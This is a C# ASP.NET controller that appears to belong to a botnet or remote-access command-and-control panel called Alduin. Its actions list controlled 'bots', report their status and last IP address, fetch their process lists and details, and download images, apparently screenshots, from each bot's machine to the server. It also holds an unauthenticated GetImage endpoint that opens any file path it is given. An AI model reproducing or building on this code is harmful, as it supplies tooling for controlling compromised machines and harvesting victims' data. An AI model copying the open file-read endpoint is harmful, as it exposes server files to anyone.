using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Alduin.Logic.Mediator.Commands;
using Alduin.Logic.Mediator.Queries;
using Alduin.Server.Modules;
using Alduin.Server.Services;
using Alduin.Web.Models;
using Alduin.Web.Models.Bot;
using Alduin.Web.Models.Commands.Commands;
using MediatR;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Localization;
using Newtonsoft.Json;

namespace Alduin.Web.Controllers
{
    public class ListController : ControllerBase
    {
        private readonly IMediator _mediator;
        private readonly IStringLocalizer<ListController> _localizer;
        private readonly GetBotImagesJsonServices _getBotImagesJsonServices;
        private readonly GetAllDeatilsServices _getalldeatilsservices;
        private readonly GetAllProcessServices _getallprocessservices;
        private readonly UpdateBotDeatilsService _updatebotdeatilsservice;
        private readonly IHostingEnvironment _env;
        private readonly DownloadFileServices _client;
        public ListController(IMediator mediator, IStringLocalizer<ListController> localizer, GetBotImagesJsonServices getBotImagesJsonServices, GetAllDeatilsServices getalldeatilsservices, GetAllProcessServices getallprocessservices, UpdateBotDeatilsService updatebotdeatilsservice, IHostingEnvironment env, DownloadFileServices client)
        {
            _mediator = mediator;
            _localizer = localizer;
            _getBotImagesJsonServices = getBotImagesJsonServices;
            _getalldeatilsservices = getalldeatilsservices;
            _getallprocessservices = getallprocessservices;
            _updatebotdeatilsservice = updatebotdeatilsservice;
            _env = env;
            _client = client;
        }
        [Authorize]
        public IActionResult Index()
        {
            return View();
        }
        [Authorize]
        public IActionResult List()
        {
            return View();
        }
        [Authorize]
        public async Task<IActionResult> BotList()
        {
            var query = new GetBotListQuery();
            var bot = await _mediator.Send(query);
            return Json(bot);
        }
        [Authorize]
        public async Task<IActionResult> BotGetDeatils(int id)
        {
            var query = new GetBotInfoByBotIdQuery
            {
                BotId = id
            };
            
            var result = await _mediator.Send(query);
            if(result.Length == 0)
            {
                var botDeatils = await _getalldeatilsservices.GetAllDeatils(id);
                await _updatebotdeatilsservice.Update(botDeatils, id);
                result = await _mediator.Send(query);
                return Json(result);
            }
            else{
                return Json(result);
            }
            
        }
        [Authorize]
        public async Task<IActionResult> BotGetProcess(int id)
        {
            var botProcess = await _getallprocessservices.GetAllProcess(id);
            return Json(botProcess);
        }
        [Authorize]
        public async Task<IActionResult> Bot(int id)
        {
            try
            {
                appsettingsModel appsettings = JsonConvert.DeserializeAnonymousType(ServerFileManager.FileReader(GetPathes.Get_SolutionMainPath() + "/Alduin.Web/appsettings.json"), new appsettingsModel());
                GetImgJsonModel ImagesJsonModel;
                var query = new GetBotByIdQuery
                {
                    Id = id
                };
                var bot = await _mediator.Send(query);
                if (_env.WebRootFileProvider.GetDirectoryContents("img/Bots/" + bot.UserName + "_" + id).Exists)
                {
                    var fullpath = _env.WebRootFileProvider.GetFileInfo("img/Bots")?.PhysicalPath + "/" + bot.UserName + "_" + id;
                    var files = Directory.GetFiles(fullpath);//Wait to test
                    List<string> images = new List<string>(files);
                    ImagesJsonModel = new GetImgJsonModel() {
                        Images = images
                    };
                    ViewData["ImageGetMode"] = "local"; 
                }
                else
                {
                    try
                    {
                        ImagesJsonModel = JsonConvert.DeserializeAnonymousType(await _getBotImagesJsonServices.GetAllImg(id), new GetImgJsonModel());
                        ViewData["ImageGetMode"] = "network";
                    }
                    catch
                    {
                        ImagesJsonModel = JsonConvert.DeserializeAnonymousType("{'Images':[]}", new GetImgJsonModel());
                        ViewData["ImageGetMode"] = "nothing";
                    };
                }
                
                
                
                DateTime DateNowUTC = DateTime.UtcNow.AddMinutes(-5);
                var status = _localizer["Offline"];
                if (bot.LastLoggedInUTC >= DateNowUTC)
                    status = _localizer["Online"];
                var botInquiryDeatils = new BotDeatilsInquiryModel
                {
                    Name = bot.UserName,
                    Domain = bot.Domain,
                    LastIPAddress = bot.LastIPAddress,
                    LastLoggedInUTC = bot.LastLoggedInUTC,
                    Status = status,
                    KeyCertified = bot.KeyCertified,
                    KeyUnique = appsettings.Stump.KeyCertified
                };
                var botmodel = new BotModel
                {
                    newImagesJsonModel = ImagesJsonModel,
                    newBotDeatilsInquiryModel = botInquiryDeatils
                };
                ViewData["ID"] = id;
                return View(botmodel);
            }
            catch (Exception e)
            {
                return Content(e.ToString());
            };
        }
        [Authorize]
        public async Task<IActionResult> DownloadAllImg(int id)
        {
            var query = new GetBotByIdQuery
            {
                Id = id
            };
            var bot = await _mediator.Send(query);
            var log = new LogModel(); 
            GetImgJsonModel ImagesJsonModel;
            try
            {
                var fullpath = "";
                if (!_env.WebRootFileProvider.GetDirectoryContents("img/Bots/" + bot.UserName + "_" + id).Exists)
                {
                    var path = _env.WebRootFileProvider.GetFileInfo("img/Bots")?.PhysicalPath;
                    Directory.CreateDirectory(path + "/" + bot.UserName + "_" + id);
                }
                else
                {
                    fullpath = _env.WebRootFileProvider.GetFileInfo("img/Bots")?.PhysicalPath + "/" + bot.UserName + "_" + id;
                }
                ImagesJsonModel = JsonConvert.DeserializeAnonymousType(await _getBotImagesJsonServices.GetAllImg(id), new GetImgJsonModel());
                var client = new DownloadFileServices();
                for (var i = 0; i < ImagesJsonModel.Images.Count; i++)
                {
                    StringBuilder FileName = new StringBuilder();
                    for(var j = ImagesJsonModel.Images[i].LastIndexOf(@"\") + 1; j < ImagesJsonModel.Images[i].Length; j++)
                    {
                        FileName.Append(ImagesJsonModel.Images[i][j]);
                    }
                   _client.DownLoadFileByWebRequest(bot.Domain,ImagesJsonModel.Images[i], fullpath + "/" + FileName.ToString());
                }
                log = new LogModel()
                {
                    KeyUnique = bot.KeyUnique,
                    Message = "Download Sucess",
                    Type = "Sucess"
                };
            }
            catch{
                log = new LogModel()
                {
                    KeyUnique = bot.KeyUnique,
                    Message = "Download Failed",
                    Type = "Error"
                };
            };
            return Json(log);
        }
        [Authorize]
        public async Task<IActionResult> Stream()
        {
            var bots = new GetBotsByStatusQuery
            {
                status = false //offline
            };
            var botlist = await _mediator.Send(bots);
            var model = new StreamModel();
            for (int i = 0; i < botlist.Length; i++)
            {
                model.NewVariables[i].Domain = botlist[i].Domain;
                model.NewVariables[i].Name = botlist[i].UserName;
            }
            return View(model);
        }
        [HttpGet]
        public IActionResult GetImage(string path)
        {
            var image = System.IO.File.OpenRead(path);
            return File(image, "image/jpeg");
        }
    }
}